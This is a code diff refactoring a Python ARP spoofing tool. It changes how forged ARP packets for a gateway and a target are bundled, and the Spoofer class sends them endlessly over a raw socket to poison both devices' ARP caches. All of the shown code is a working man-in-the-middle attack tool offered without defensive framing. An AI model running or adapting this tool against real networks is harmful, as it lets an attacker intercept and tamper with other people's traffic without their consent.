@@ -24,6 +24,19 @@ class ARPPacket(object):
         self.gateway_mac = self._mac_to_hex(gateway_mac)
         self.target_mac = self._mac_to_hex(target_mac)
 
+    def __iter__(self):
+        yield from (self.arp_pkt_to_gateway, self.arp_pkt_to_target)
+
+    @staticmethod
+    def _mac_to_hex(mac_address: str) -> bytes:
+        """
+        Transform a MAC address string from IEEE 802.3 standard to a
+        byte sequence of hexadecimal values.
+        Ex: 'AB:BC:CD:12:23:34' to b'\xab\xbc\xcd\x12#4'
+        """
+        return b''.join(bytes.fromhex(octet) for octet in
+                        re.split('[:-]', mac_address))
+
     @property
     def arp_header(self):
         """Builds a byte-string representation of the ARP header of a
@@ -57,47 +70,31 @@ class ARPPacket(object):
                          self.attacker_mac, self.gateway_ip,
                          self.target_mac, self.target_ip))
 
-    @staticmethod
-    def _mac_to_hex(mac_address: str) -> bytes:
-        """
-        Transform a MAC address string from IEEE 802.3 standard to a
-        byte sequence of hexadecimal values.
-        Ex: 'AB:BC:CD:12:23:34' to b'\xab\xbc\xcd\x12#4'
-        """
-        return b''.join(bytes.fromhex(octet) for octet in
-                        re.split('[:-]', mac_address))
-
 
 class Spoofer(object):
-    def __init__(self,
-                 interface: str, *,
-                 gateway_arp_packet: bytes,
-                 target_arp_packet: bytes,
-                 interval: float):
+    def __init__(self, interface: str, *, arp_packets, interval: float):
         self.interface = interface
-        self.gateway_arp_pkt = gateway_arp_packet
-        self.target_arp_pkt = target_arp_packet
+        self.arp_packets = arp_packets
         self.interval = interval
 
     def execute(self):
         with socket(PF_PACKET, SOCK_RAW, ntohs(0x0800)) as sock:
             sock.bind((self.interface, htons(0x0800)))
             while True:
-                sock.send(self.target_arp_pkt)
-                sock.send(self.gateway_arp_pkt)
+                for packet in self.arp_packets:
+                    sock.send(packet)
                 time.sleep(self.interval)
 
 
 def spoof(args):
     """Controls the flow of execution of the ARP Spoofer tool."""
-    packet = ARPPacket(attacker_mac=args.attackermac,
-                       gateway_mac=args.gatemac,
-                       target_mac=args.targetmac,
-                       gateway_ip=args.gateip,
-                       target_ip=args.targetip)
+    packets = ARPPacket(attacker_mac=args.attackermac,
+                        gateway_mac=args.gatemac,
+                        target_mac=args.targetmac,
+                        gateway_ip=args.gateip,
+                        target_ip=args.targetip)
     spoofer = Spoofer(interface=args.interface,
-                      gateway_arp_packet=packet.arp_pkt_to_gateway,
-                      target_arp_packet=packet.arp_pkt_to_target,
+                      arp_packets=packets,
                       interval=args.interval)
 
     print('[+] ARP Spoofing attack initiated at {0}. Press Ctrl-C to '
